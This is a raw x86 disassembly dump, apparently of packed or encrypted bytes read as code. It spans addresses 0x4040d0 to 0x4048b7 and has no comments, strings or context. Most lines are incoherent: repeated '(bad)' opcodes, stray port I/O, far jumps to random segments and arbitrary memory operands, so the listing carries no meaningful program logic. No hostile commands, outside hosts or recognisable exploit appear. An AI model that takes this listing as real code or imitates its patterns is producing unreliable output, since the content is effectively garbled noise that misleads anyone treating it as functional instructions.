  4040d0:	aaa    
  4040d1:	jns    0x40413a
  4040d3:	into   
  4040d4:	add    bl,BYTE PTR [edx+edi*1+0x2d]
  4040d8:	in     eax,dx
  4040d9:	mov    ds:0x9d7e2177,eax
  4040de:	xor    BYTE PTR [eax-0x76],0x59
  4040e2:	scas   al,BYTE PTR es:[edi]
  4040e3:	cmp    BYTE PTR [ebx+esi*4-0x37ea06f1],0x46
  4040eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040ec:	mov    al,ds:0xe1142310
  4040f1:	add    DWORD PTR [ebx-0x5e01508f],ecx
  4040f7:	(bad)  
  4040f9:	push   0xffffffd0
  4040fb:	ds inc edx
  4040fd:	push   es
  4040fe:	fs mov bl,0x28
  404101:	mov    ebx,0xf7734fcf
  404106:	mov    bl,0x44
  404108:	dec    edi
  404109:	xchg   DWORD PTR [edi+0x1],edi
  40410c:	mov    DWORD PTR [ecx],ebx
  40410e:	cmp    bh,BYTE PTR [ebp+0x3ce346cb]
  404114:	fs ins BYTE PTR es:[edi],dx
  404116:	cwde   
  404117:	push   ebp
  404118:	push   es
  404119:	sti    
  40411a:	dec    esp
  40411b:	mov    ch,0x7a
  40411d:	mov    esi,0x76d7c799
  404122:	rol    BYTE PTR [ebx],1
  404124:	jno    0x4040f1
  404126:	push   esp
  404127:	(bad)  [ebx+ecx*1+0x6da8193d]
  40412e:	(bad)  
  40412f:	loop   0x404198
  404131:	mov    ds:0xd23b016f,al
  404136:	xor    al,0x9b
  404138:	inc    edx
  404139:	mov    al,ds:0x31dc1752
  40413e:	rol    BYTE PTR [edi+0x7b],0x68
  404142:	hlt    
  404143:	cmp    dl,BYTE PTR [eax-0x5a]
  404146:	jne    0x40411d
  404148:	(bad)  
  404149:	sbb    BYTE PTR [edx+0x2b],bl
  40414c:	sbb    edi,0xb724e95
  404152:	adc    al,BYTE PTR [esi+0x50]
  404155:	add    BYTE PTR [esi+0x5],bh
  404158:	in     eax,0xcd
  40415a:	rcr    DWORD PTR [edx],cl
  40415c:	dec    eax
  40415d:	pop    ecx
  40415e:	xchg   ebx,eax
  40415f:	xchg   ebx,eax
  404160:	out    dx,al
  404161:	jl     0x40419b
  404163:	cmp    DWORD PTR [ebx+0x1e],ebp
  404166:	imul   ebp,edi,0xffffffd4
  404169:	mov    al,ds:0x67da93b1
  40416e:	xchg   esi,eax
  40416f:	mov    esi,0xc69ef7e6
  404174:	adc    BYTE PTR [edx+0xa],bh
  404177:	xchg   esp,eax
  404178:	out    dx,al
  404179:	test   al,0xf5
  40417b:	dec    ebp
  40417c:	xchg   edi,eax
  40417d:	lahf   
  40417e:	je     0x40411e
  404180:	lds    esp,FWORD PTR [eax+0x46]
  404183:	push   0xf0c37a6
  404188:	ins    BYTE PTR es:[edi],dx
  404189:	jb     0x4041a1
  40418b:	dec    esi
  40418d:	addr16 inc edi
  40418f:	in     eax,dx
  404190:	enter  0x1cd2,0x3d
  404194:	dec    esi
  404195:	or     BYTE PTR [esi+0x5c44c99d],bh
  40419b:	shr    DWORD PTR [edx+0x164737be],1
  4041a1:	jl     0x404215
  4041a3:	cli    
  4041a4:	je     0x404184
  4041a6:	mov    cl,0x58
  4041a8:	setp   BYTE PTR [eax-0x2c]
  4041ac:	in     al,0xfe
  4041ae:	sbb    eax,0xd9aa976
  4041b3:	retf   0x5bd3
  4041b6:	sahf   
  4041b7:	imul   eax,ecx,0x10
  4041ba:	sbb    BYTE PTR [edi+esi*4+0x54],al
  4041be:	mov    eax,0x6d71eb55
  4041c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041c4:	fist   DWORD PTR [esi-0x9c22079]
  4041ca:	adc    edi,DWORD PTR [edi-0x5315b422]
  4041d0:	mov    bl,bh
  4041d2:	mov    bh,0x94
  4041d4:	jg     0x4041a7
  4041d6:	inc    esp
  4041d7:	ja     0x40423f
  4041d9:	inc    ecx
  4041da:	call   0x15ca1e82
  4041df:	xor    BYTE PTR [ecx],bh
  4041e1:	cmp    DWORD PTR [esi],ebp
  4041e3:	dec    edx
  4041e4:	fbld   TBYTE PTR [edx-0x6117fe5e]
  4041ea:	jmp    0xb98a:0x284e9493
  4041f1:	and    esp,esi
  4041f3:	ja     0x404192
  4041f5:	xor    al,0x74
  4041f7:	popf   
  4041f8:	fs push eax
  4041fa:	loop   0x4041ef
  4041fc:	push   ecx
  4041fd:	lods   eax,DWORD PTR ds:[esi]
  4041fe:	dec    eax
  4041ff:	mov    DWORD PTR [edi-0x67c45bb4],esp
  404205:	pop    ebx
  404206:	les    ecx,FWORD PTR [ebx+0x1]
  404209:	or     BYTE PTR [edi-0x36],ch
  40420c:	jmp    FWORD PTR [ebx+ecx*2]
  40420f:	cli    
  404210:	jl     0x404196
  404212:	les    edi,FWORD PTR [edx]
  404214:	(bad)  
  404215:	mov    esp,0xb55cef5e
  40421a:	cwde   
  40421b:	mov    esp,0x502b6430
  404220:	pop    ss
  404221:	mov    esp,0x435a7081
  404226:	pop    edi
  404227:	test   esi,ebp
  404229:	cld    
  40422a:	sti    
  40422b:	clc    
  40422c:	gs mov edx,0x4d08c51c
  404232:	pop    edx
  404233:	inc    ebx
  404234:	not    dl
  404236:	loopne 0x4042aa
  404238:	clc    
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	psubsb mm2,QWORD PTR [esi+0x184f8ea2]
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0x4a70707d
  404265:	jnp    0x404232
  404267:	jecxz  0x40423f
  404269:	mov    edi,0x3105a4fd
  40426e:	pop    edi
  40426f:	out    0x8e,al
  404271:	dec    esp
  404272:	scas   eax,DWORD PTR es:[edi]
  404273:	xchg   esi,eax
  404274:	xchg   edx,eax
  404275:	cwde   
  404276:	dec    esi
  404277:	xchg   edi,eax
  404278:	fwait
  404279:	or     esi,esp
  40427b:	pop    esp
  40427c:	outs   dx,DWORD PTR ds:[esi]
  40427d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40427e:	iret   
  40427f:	jp     0x40423b
  404281:	call   0xaa03:0x1072bc2e
  404288:	out    0xc2,al
  40428a:	test   eax,0x6446dd50
  40428f:	sbb    bh,BYTE PTR [ecx]
  404291:	fwait
  404292:	test   BYTE PTR [ebx+esi*8+0x7d],cl
  404296:	xchg   esi,eax
  404297:	or     esi,DWORD PTR fs:[eax+0x58]
  40429b:	ret    0xd43e
  40429e:	adc    DWORD PTR [ebx],ebp
  4042a0:	enter  0x48e3,0x1
  4042a4:	les    ecx,FWORD PTR [ecx]
  4042a6:	div    DWORD PTR [ebp-0x13101826]
  4042ac:	repnz hlt 
  4042ae:	(bad)  
  4042af:	sbb    ah,BYTE PTR [eax+esi*1]
  4042b2:	jle    0x4042f3
  4042b4:	and    ebx,edx
  4042b6:	dec    edi
  4042b7:	xor    eax,0x1310e3e3
  4042bc:	jmp    0x4042b1
  4042be:	mov    edx,DWORD PTR [edx-0x23]
  4042c1:	cdq    
  4042c2:	adc    BYTE PTR [ecx],cl
  4042c4:	loopne 0x40424c
  4042c6:	leave  
  4042c7:	outs   dx,BYTE PTR ds:[si]
  4042c9:	dec    edi
  4042ca:	sbb    cl,BYTE PTR [ecx-0x27]
  4042cd:	scas   eax,DWORD PTR es:[edi]
  4042ce:	popa   
  4042cf:	push   es
  4042d0:	pop    edx
  4042d1:	pop    ebp
  4042d2:	idiv   DWORD PTR [ebp-0x51]
  4042d5:	maxps  xmm2,xmm0
  4042d8:	and    DWORD PTR [edx+0x877a08],eax
  4042de:	test   BYTE PTR [ebp+ecx*8+0x7be767c9],dh
  4042e5:	leave  
  4042e6:	sbb    al,0xbb
  4042e8:	jnp    0x4042d1
  4042ea:	call   0x81a9b98
  4042ef:	dec    edx
  4042f0:	pop    ecx
  4042f1:	or     DWORD PTR [ecx+ecx*1],edx
  4042f4:	cmp    ebp,DWORD PTR [ecx-0x1]
  4042f7:	cld    
  4042f8:	pushf  
  4042f9:	mov    eax,0x454b72a1
  4042fe:	dec    ebx
  4042ff:	hlt    
  404300:	mov    edx,eax
  404302:	fdivr  QWORD PTR [esi]
  404304:	push   0xffffffa9
  404306:	cmc    
  404307:	xor    ah,BYTE PTR [edi+0xb]
  40430a:	pop    edi
  40430b:	jbe    0x4042e5
  40430d:	pop    ebx
  40430e:	stc    
  40430f:	arpl   WORD PTR [eax+0x2a306d53],si
  404315:	cld    
  404316:	jae    0x4042cb
  404318:	mov    ecx,0x7f3c59a4
  40431d:	inc    esp
  40431e:	cwde   
  40431f:	mov    al,0xeb
  404321:	repz mov ebx,0x426e1327
  404327:	jno    0x404367
  404329:	jl     0x4042bc
  40432b:	(bad)  
  40432c:	and    DWORD PTR [eax],edx
  40432e:	data16 lock lock aas 
  404332:	pop    ss
  404333:	retf   
  404334:	(bad)  
  404335:	pushf  
  404336:	test   eax,0xc326827d
  40433b:	mov    cl,0x48
  40433d:	and    ah,bl
  40433f:	xor    BYTE PTR [esi],dh
  404341:	mov    al,0x1c
  404343:	sbb    ebp,DWORD PTR [ecx-0x2c]
  404346:	(bad)  
  404347:	lock sbb dl,BYTE PTR cs:[esi]
  40434b:	je     0x4042cd
  40434d:	sub    eax,0xa7bcff34
  404352:	add    WORD PTR [ebp+0x12a2b9ff],dx
  404359:	xor    eax,ebx
  40435b:	mov    bl,0xac
  40435d:	ror    DWORD PTR [ebx-0x53b93be6],1
  404363:	aad    0xe1
  404365:	jbe    0x404366
  404367:	bnd jp 0x404390
  40436a:	mov    DWORD PTR [edx-0x18],edx
  40436d:	dec    ebx
  40436e:	lds    ebx,FWORD PTR [edx+0x77]
  404371:	mov    WORD PTR cs:[ebx-0x53ecf685],ds
  404378:	mov    BYTE PTR [ebp-0x6a8e56b],al
  40437e:	push   edx
  40437f:	xchg   ebx,eax
  404380:	(bad)  
  404381:	cld    
  404382:	rcl    DWORD PTR [eax+ebp*8+0x2bd61f09],0x1d
  40438a:	arpl   WORD PTR [edx+ecx*1+0x1b6e1e3e],ax
  404391:	xchg   ebp,eax
  404392:	retf   0xb029
  404395:	add    DWORD PTR [edi-0x73],edx
  404398:	daa    
  404399:	mov    esi,0x3bd8a428
  40439e:	es jns 0x404403
  4043a1:	add    ecx,DWORD PTR [ebx]
  4043a3:	sub    ch,cl
  4043a5:	(bad)  
  4043a6:	push   esp
  4043a7:	mov    eax,0x4d99a8cb
  4043ac:	mov    dl,0xbb
  4043ae:	in     al,0x76
  4043b0:	mov    ebx,eax
  4043b2:	and    ecx,edx
  4043b4:	(bad)  
  4043b5:	popf   
  4043b6:	and    eax,0x732a5028
  4043bb:	fst    DWORD PTR [ebx-0x74]
  4043be:	add    al,0xad
  4043c0:	loope  0x40442d
  4043c2:	icebp  
  4043c3:	mov    esi,0xada61862
  4043c8:	pushf  
  4043c9:	adc    DWORD PTR fs:[esi+eax*1+0x4dc23f21],edx
  4043d1:	scas   eax,DWORD PTR es:[edi]
  4043d2:	(bad)  
  4043d3:	dec    ebp
  4043d4:	or     al,0xd1
  4043d6:	sub    BYTE PTR [edx+0x5b],al
  4043d9:	pop    edx
  4043da:	nop
  4043db:	aaa    
  4043dc:	dec    esp
  4043dd:	adc    BYTE PTR gs:[ebx],dl
  4043e0:	(bad)  
  4043e1:	shr    al,1
  4043e3:	scas   eax,DWORD PTR es:[edi]
  4043e4:	stos   BYTE PTR es:[edi],al
  4043e5:	jge    0x4043fe
  4043e7:	gs loope 0x4043bd
  4043ea:	mov    eax,0x6c4a4815
  4043ef:	mov    edi,0x19f30683
  4043f4:	shl    BYTE PTR [eax-0x55],0x69
  4043f8:	sub    eax,0xd6ce3c84
  4043fd:	fwait
  4043fe:	jmp    0xe5521e98
  404403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404404:	retf   0xf17e
  404407:	loopne 0x404442
  404409:	scas   al,BYTE PTR es:[edi]
  40440a:	sbb    eax,0x42d784f2
  40440f:	pushf  
  404410:	retf   0xe66b
  404413:	jns    0x404402
  404415:	push   eax
  404416:	mov    eax,ds:0xbebedba7
  40441b:	mov    ch,0x10
  40441d:	aas    
  40441e:	repz pushf 
  404420:	jo     0x4043ea
  404422:	mov    esi,0x6a1e2132
  404427:	test   al,dh
  404429:	xor    ah,BYTE PTR [ebx]
  40442b:	jno    0x404440
  40442d:	shl    bh,0xc4
  404430:	push   ss
  404431:	adc    ecx,DWORD PTR [esi-0x50cd9114]
  404437:	or     BYTE PTR [ebp+0xd8caa80],0x44
  40443e:	mov    ecx,0x2a0546
  404443:	leave  
  404444:	fyl2xp1 
  404446:	mov    dl,0x35
  404448:	add    bh,bh
  40444a:	(bad)  
  40444c:	scas   eax,DWORD PTR es:[edi]
  40444d:	(bad)  
  40444e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40444f:	push   es
  404450:	mov    cl,0xec
  404452:	call   0x2f59:0xcdb9b594
  404459:	retf   
  40445a:	mov    ecx,0x340af131
  40445f:	into   
  404460:	shl    BYTE PTR [edx-0x59],cl
  404463:	mov    ecx,0x3d5062b2
  404468:	adc    BYTE PTR [ecx-0x21],al
  40446b:	arpl   WORD PTR [eax-0x17585d2f],sp
  404471:	mov    edx,0x1f5a7cd9
  404476:	jne    0x4044c7
  404478:	imul   edx,DWORD PTR [eax-0x6],0x2dcd2181
  40447f:	and    eax,0xffffff8a
  404482:	push   ss
  404483:	pop    eax
  404484:	cmp    BYTE PTR [edi],bh
  404486:	add    BYTE PTR [ecx+0x4b8bd29a],bh
  40448c:	(bad)  
  40448d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40448e:	js     0x40444b
  404490:	or     BYTE PTR [esi-0x55],ah
  404493:	mov    ebp,eax
  404495:	pop    ebx
  404496:	cld    
  404497:	push   es
  404498:	sbb    eax,0x5e298656
  40449d:	or     ch,BYTE PTR [edi+eiz*4]
  4044a0:	pop    ebp
  4044a1:	adc    cl,BYTE PTR [ecx+0x2100fb42]
  4044a7:	ins    DWORD PTR es:[edi],dx
  4044a8:	push   ss
  4044a9:	mov    cl,0xf9
  4044ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ac:	jo     0x4044da
  4044ae:	mov    cs,WORD PTR [esi-0x253ea35]
  4044b4:	cmp    eax,0x830083d5
  4044b9:	cmova  edx,DWORD PTR [esi]
  4044bc:	out    dx,eax
  4044bd:	jo     0x404510
  4044bf:	mov    ebx,0xdfb35e22
  4044c5:	adc    dh,BYTE PTR [ebx+0x77]
  4044c8:	and    DWORD PTR [edi],eax
  4044ca:	jmp    0xd129:0x33386568
  4044d1:	pop    ebx
  4044d2:	jns    0x4044d3
  4044d4:	std    
  4044d5:	cmp    bh,ah
  4044d7:	push   ss
  4044d8:	call   0xa16d:0xe453bc6f
  4044df:	aas    
  4044e0:	ins    DWORD PTR es:[edi],dx
  4044e1:	push   ss
  4044e2:	push   ebx
  4044e3:	pop    ss
  4044e4:	adc    al,0xa0
  4044e6:	shl    ebp,1
  4044e8:	add    ebx,DWORD PTR [ecx+0x11]
  4044eb:	inc    ecx
  4044ec:	imul   ebp,DWORD PTR [edi+0x44],0xffffffd1
  4044f0:	xor    DWORD PTR [edx-0x7f],esp
  4044f3:	push   ebx
  4044f4:	jbe    0x40448c
  4044f6:	jl     0x4044cf
  4044f8:	mov    edx,0xac7142cf
  4044fd:	jno    0x40450e
  4044ff:	pop    ebx
  404500:	cs xchg ebx,eax
  404502:	and    DWORD PTR [esi+0x7d],0xbab8c2b1
  404509:	add    ecx,edi
  40450b:	jmp    0x718f38e8
  404510:	out    0x6a,al
  404512:	sbb    BYTE PTR [eax+0x35],bl
  404515:	sub    dh,0x21
  404518:	call   0xf1edb990
  40451d:	(bad)  
  40451e:	xor    ebx,edx
  404520:	aam    0xeb
  404522:	add    esi,DWORD PTR [edx+0x3c]
  404525:	add    dh,BYTE PTR [eax+0x2615be6b]
  40452b:	in     eax,0x69
  40452d:	sbb    DWORD PTR [edx],0xffffffd2
  404530:	push   cs
  404531:	dec    ecx
  404532:	and    DWORD PTR [edx+0xb],eax
  404535:	outs   dx,BYTE PTR ds:[esi]
  404536:	sbb    eax,0x70b8c27c
  40453b:	pop    ebx
  40453c:	xchg   esp,eax
  40453d:	(bad)  
  40453e:	xchg   edi,eax
  40453f:	jb     0x4045b8
  404541:	jmp    0x4044cf
  404543:	sti    
  404544:	xchg   ebp,eax
  404545:	xor    al,0xb9
  404548:	push   edx
  404549:	mov    BYTE PTR [ecx-0x26],ah
  40454c:	mov    al,0x9d
  40454e:	lds    esi,FWORD PTR [edx+ebp*1]
  404551:	adc    BYTE PTR [ebx],ch
  404553:	fdivr  DWORD PTR ds:0xe773bebe
  404559:	jecxz  0x4045c7
  40455b:	pop    eax
  40455c:	scas   eax,DWORD PTR es:[edi]
  40455d:	mov    ebx,DWORD PTR [edx-0x1f]
  404560:	cmp    edx,DWORD PTR [esi+edx*2+0x68]
  404564:	mov    WORD PTR [ebp-0x3bcf2f5c],?
  40456a:	popf   
  40456b:	in     al,0x2f
  40456d:	daa    
  40456e:	aas    
  40456f:	bound  ebp,QWORD PTR [esi-0x2]
  404572:	mov    edx,0xc5ff5f45
  404577:	arpl   WORD PTR [esi+0x73],dx
  40457a:	shl    BYTE PTR [edi-0x589dbcb7],0x11
  404581:	mov    dh,0x83
  404583:	mov    al,0x7c
  404585:	push   cs
  404586:	dec    esi
  404587:	add    dl,al
  404589:	sub    ecx,DWORD PTR [ebx]
  40458b:	or     al,0x15
  40458d:	or     ebx,DWORD PTR [edi-0x15]
  404590:	test   DWORD PTR [ebx+0x64b93837],eax
  404596:	inc    ebx
  404597:	adc    BYTE PTR [edi+0x1f],0xb1
  40459b:	shl    BYTE PTR [ecx+esi*8+0x43],0xd1
  4045a0:	push   ss
  4045a1:	mov    BYTE PTR [eax-0x26],al
  4045a4:	lea    ecx,[eax+0x2b]
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fd82,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	add    BYTE PTR [eax],ah
  4045c9:	pop    ss
  4045ca:	fs or  al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xa970707d
  4045d4:	push   edx
  4045d5:	mov    ch,0x35
  4045d7:	pop    esp
  4045d8:	sub    bh,0xa0
  4045db:	sbb    al,dh
  4045dd:	add    ecx,DWORD PTR [eax]
  4045df:	aas    
  4045e0:	and    al,0xd6
  4045e2:	in     eax,0xa3
  4045e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045e5:	into   
  4045e6:	dec    eax
  4045e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045e8:	aaa    
  4045e9:	(bad)  
  4045ea:	addr16 int 0xf5
  4045ed:	push   ds
  4045ee:	and    bl,BYTE PTR [ebp-0x62974f38]
  4045f4:	outs   dx,DWORD PTR ds:[esi]
  4045f5:	mov    bh,dl
  4045f7:	push   es
  4045f8:	repnz cmp ebx,DWORD PTR [eax+0x17]
  4045fc:	ret    
  4045fd:	aam    0xc
  4045ff:	mov    al,0x2e
  404601:	add    ebx,ebx
  404603:	mov    esi,0x902f498b
  404608:	popa   
  404609:	ja     0x404641
  40460b:	mul    BYTE PTR [esi-0x3c8087c0]
  404611:	popf   
  404612:	fdiv   QWORD PTR [ecx]
  404614:	ret    0x5dc8
  404617:	outs   dx,DWORD PTR ds:[esi]
  404618:	and    BYTE PTR [esi-0xa699f21],ah
  40461e:	ret    
  40461f:	push   esi
  404620:	xlat   BYTE PTR ds:[ebx]
  404621:	test   eax,0x67cfe330
  404626:	push   cs
  404627:	push   eax
  404628:	cs clc 
  40462a:	je     0x404672
  40462c:	pop    es
  40462d:	mov    esi,0x103a2e18
  404632:	jb     0x40465a
  404634:	pop    edi
  404635:	ss pop ecx
  404637:	sub    eax,0x3729f6d6
  40463c:	push   ebp
  40463d:	(bad)  
  40463e:	cmc    
  40463f:	and    eax,DWORD PTR [ebx-0x1b494e63]
  404645:	xchg   ecx,eax
  404646:	outs   dx,DWORD PTR ds:[esi]
  404647:	rcr    BYTE PTR [esi],0x5b
  40464a:	pop    ebx
  40464b:	sahf   
  40464c:	je     0x4046cc
  40464e:	mov    al,ds:0x3e7047b1
  404653:	push   ds
  404654:	xchg   dh,ah
  404656:	pop    eax
  404657:	addr16 out 0xbe,al
  40465a:	xchg   DWORD PTR [ebx],ecx
  40465c:	not    esi
  40465e:	jecxz  0x40465a
  404660:	cmc    
  404661:	push   eax
  404662:	call   0x2560:0x64d26c1b
  404669:	cmp    al,0x73
  40466b:	or     esi,DWORD PTR [edx-0x67]
  40466e:	js     0x404634
  404670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404671:	dec    ebx
  404672:	dec    ebx
  404673:	or     DWORD PTR [edi-0x1b],ebx
  404676:	sbb    DWORD PTR [edi],edi
  404678:	lahf   
  404679:	loope  0x4046cf
  40467b:	mov    eax,0xe7d90739
  404680:	fcom   QWORD PTR [ebp+0x63e897ef]
  404686:	mov    edi,DWORD PTR [edi]
  404688:	sub    eax,DWORD PTR ds:0x48e193cc
  40468e:	push   edi
  40468f:	mov    eax,0x9635621
  404694:	idiv   DWORD PTR [eax+0x57e72198]
  40469a:	cli    
  40469b:	cli    
  40469c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40469d:	jle    0x4046bf
  40469f:	add    bh,BYTE PTR [edi+0x686e4ab0]
  4046a5:	xchg   edi,eax
  4046a6:	fild   DWORD PTR [ebp-0x6cd8f0d1]
  4046ac:	icebp  
  4046ad:	add    edi,esp
  4046af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046b0:	dec    eax
  4046b1:	sbb    eax,DWORD PTR [edi+0x2d3a10a7]
  4046b7:	rcr    ebp,cl
  4046b9:	adc    ebx,DWORD PTR [ebp+0x58]
  4046bc:	dec    ecx
  4046bd:	cld    
  4046be:	jb     0x404660
  4046c0:	test   DWORD PTR [ebp+0x4b],edi
  4046c3:	jmp    0x40473f
  4046c5:	shr    bh,0xcb
  4046c8:	(bad)  
  4046c9:	shl    DWORD PTR [edi+edi*4+0x3e],1
  4046cd:	pop    eax
  4046ce:	dec    BYTE PTR [esi-0x38]
  4046d1:	xadd   BYTE PTR [esi-0x342b3832],bh
  4046d8:	rol    BYTE PTR [ecx],0xc6
  4046db:	in     al,dx
  4046dc:	loopne 0x40466d
  4046de:	adc    BYTE PTR [edi-0x74f4536c],bh
  4046e4:	jle    0x4046d0
  4046e6:	xchg   esp,eax
  4046e7:	add    BYTE PTR [edi-0x38],dl
  4046ea:	xor    edx,DWORD PTR [ebx+0x68a9fd]
  4046f0:	ins    BYTE PTR es:[edi],dx
  4046f1:	pushf  
  4046f2:	xor    BYTE PTR [ebp+0x1133ca14],0x31
  4046f9:	aaa    
  4046fa:	adc    eax,0xc6eafe16
  4046ff:	jg     0x4046aa
  404701:	int    0x15
  404703:	fcmovnb st,st(7)
  404705:	mov    edx,0xd0b427b7
  40470a:	lock jle 0x4046af
  40470d:	mov    ah,BYTE PTR [ecx+0x16c51d8a]
  404713:	dec    ecx
  404714:	leave  
  404715:	sub    eax,0xbcb24ee8
  40471a:	fmul   DWORD PTR [ecx]
  40471c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40471d:	es mov al,0x46
  404720:	jmp    0x829d:0x4fa7951f
  404727:	and    ch,bh
  404729:	mov    edi,0xe7b51fe9
  40472e:	and    BYTE PTR gs:[edi-0x7e],ah
  404732:	nop
  404733:	dec    eax
  404734:	cmp    al,0x4d
  404736:	inc    ebx
  404737:	fbld   TBYTE PTR [edi+0x23]
  40473a:	adc    DWORD PTR [eax-0x2],esi
  40473d:	int    0x74
  40473f:	pop    edx
  404740:	sahf   
  404741:	pushf  
  404742:	out    0x2c,eax
  404744:	sar    BYTE PTR [esi-0x14756bc5],cl
  40474a:	push   ecx
  40474b:	xor    al,0x1c
  40474d:	cmp    BYTE PTR ds:0xfffef461,bl
  404753:	xchg   ecx,eax
  404754:	push   esi
  404755:	xor    dl,BYTE PTR [edi+eax*4+0x395fb740]
  40475c:	jns    0x404738
  40475e:	std    
  40475f:	inc    eax
  404760:	dec    esp
  404761:	fisttp QWORD PTR [ecx]
  404763:	nop
  404764:	jle    0x4047a8
  404766:	jbe    0x40472a
  404768:	and    cl,BYTE PTR [edi-0x50]
  40476b:	retf   
  40476c:	xor    bh,BYTE PTR [edi+0x3d]
  40476f:	imul   al
  404771:	and    BYTE PTR [ebx-0x4d],cl
  404774:	test   al,0xb1
  404776:	add    al,0x16
  404778:	call   0x9aaa325c
  40477d:	sbb    al,0x13
  40477f:	out    dx,eax
  404780:	rcr    BYTE PTR [esi+edi*1-0x6d6d81c6],cl
  404787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404788:	test   bl,bl
  40478a:	enter  0xe8ed,0xfb
  40478e:	xlat   BYTE PTR ds:[ebx]
  40478f:	out    0x86,al
  404791:	ja     0x4047bd
  404793:	xor    eax,0xa09c9413
  404798:	mov    ds:0x34ae21f3,eax
  40479d:	clc    
  40479e:	pushf  
  40479f:	sbb    eax,0xea7d11b5
  4047a4:	adc    bh,BYTE PTR [eax+0x455bb6eb]
  4047aa:	sub    esp,DWORD PTR [esi]
  4047ac:	pop    ebp
  4047ad:	sub    BYTE PTR [ebx+eiz*8+0x17],cl
  4047b1:	mov    cl,0x7c
  4047b3:	in     eax,0x99
  4047b5:	mov    es,WORD PTR [edx-0x62ff1925]
  4047bb:	ror    DWORD PTR [ebx+0x497dbee],0x36
  4047c2:	lock mov al,ds:0x46e28bab
  4047c8:	fsub   DWORD PTR [esi+0x2c]
  4047cb:	retf   
  4047cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047cd:	and    bl,dh
  4047cf:	mov    bl,0xe8
  4047d1:	iret   
  4047d2:	jno    0x404842
  4047d4:	pop    ebx
  4047d5:	adc    eax,0xf6150afb
  4047da:	mov    bh,0x9f
  4047dc:	mov    dh,0x81
  4047de:	test   al,0xc2
  4047e0:	sbb    edx,0x9e2cb4d1
  4047e6:	or     bh,BYTE PTR [esi+0x5865851]
  4047ec:	fadd   QWORD PTR [edi-0x45]
  4047ef:	lea    esi,[ebx-0x8]
  4047f2:	dec    edi
  4047f3:	sub    al,BYTE PTR [ecx-0x6e]
  4047f6:	mov    edi,0x9e0c53ec
  4047fb:	ret    
  4047fc:	into   
  4047fd:	frstor [edi-0x6448e4f7]
  404803:	pop    esp
  404804:	adc    DWORD PTR [eax-0x6d],esi
  404807:	dec    ebp
  404808:	push   ebx
  404809:	ins    DWORD PTR es:[edi],dx
  40480a:	aaa    
  40480b:	lods   al,BYTE PTR ds:[esi]
  40480c:	test   eax,0x457c048d
  404811:	in     eax,dx
  404812:	lods   eax,DWORD PTR ds:[si]
  404814:	adc    DWORD PTR [esi+edi*4+0x6474a6e2],ebx
  40481b:	sbb    BYTE PTR ds:0xf02ffeb7,bl
  404821:	pop    edi
  404822:	inc    ecx
  404823:	xchg   DWORD PTR [ebx+0x6],esp
  404826:	nop
  404827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404828:	out    dx,al
  404829:	dec    esi
  40482a:	lock adc DWORD PTR [ebx+0x452cdd5e],ebx
  404831:	cdq    
  404832:	and    al,0x63
  404834:	stc    
  404835:	and    al,0xad
  404837:	aaa    
  404838:	dec    edx
  404839:	mov    cl,0x6c
  40483b:	out    dx,al
  40483c:	sub    BYTE PTR [ebx-0x1d],dh
  40483f:	sub    DWORD PTR [ebp+0xec783cc],0xf7634826
  404849:	retf   
  40484a:	outs   dx,BYTE PTR ds:[esi]
  40484b:	xor    dl,BYTE PTR [ebx-0x2f033943]
  404851:	fcmovnu st,st(2)
  404853:	dec    edi
  404854:	pop    es
  404855:	mov    dh,0x1d
  404857:	push   es
  404858:	test   DWORD PTR [ebp-0x72ba4d03],edi
  40485e:	out    0x5e,al
  404860:	int    0x5d
  404862:	adc    DWORD PTR [ecx-0x52fe113a],0x2f6884a5
  40486c:	and    BYTE PTR [edx+0x156c511a],ah
  404872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404873:	jl     0x40485e
  404875:	inc    edi
  404876:	mov    eax,0xade6f363
  40487b:	mov    edi,0xe9ad707
  404880:	sub    ebx,edi
  404882:	fxch   st(3)
  404884:	leave  
  404885:	or     esi,DWORD PTR [ebp+0x3f]
  404888:	aas    
  404889:	lds    esi,FWORD PTR [esi+eax*4]
  40488c:	in     al,0x3
  40488e:	xchg   ecx,eax
  40488f:	dec    ebx
  404890:	mov    es,WORD PTR [ecx+0x6a]
  404893:	(bad)
  404896:	ret    
  404897:	xor    al,0x2f
  404899:	jae    0x4048ca
  40489b:	arpl   cx,di
  40489d:	call   0x6ff:0xc3638d78
  4048a4:	pusha  
  4048a5:	xor    al,0xb
  4048a7:	xchg   ebx,eax
  4048a8:	imul   ebx,DWORD PTR [eax+0x7dddf483],0x1428416
  4048b2:	int3   
  4048b3:	add    esi,ecx
  4048b5:	out    0x62,al
  4048b7:	sub    ebx,ecx
